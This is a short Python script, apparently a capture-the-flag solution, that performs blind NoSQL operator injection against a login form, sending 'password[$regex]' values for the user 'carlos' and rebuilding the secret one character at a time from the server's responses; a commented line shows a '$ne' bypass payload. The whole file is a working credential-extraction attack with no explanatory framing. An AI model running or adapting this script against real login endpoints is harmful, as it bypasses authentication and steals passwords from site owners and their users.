import requests
import string


url = ""
#data = {"username[$regex]": atual + anterior, "password[$ne]": "a"}

chars = string.printable

def extract(atual,anterior):
    data = {"username": "carlos", "password[$regex]": atual + anterior}
    r = requests.post(url,data=data)
    return r.text


def main():
    valor_completo = "^"
    while True:
        for printable in chars:
            if printable in ['*','+','.','?','|']: continue
            result = extract(valor_completo,printable)
            if "CS{" in result:
                valor_completo = valor_completo +  printable
                break
            print(valor_completo + printable)
main()
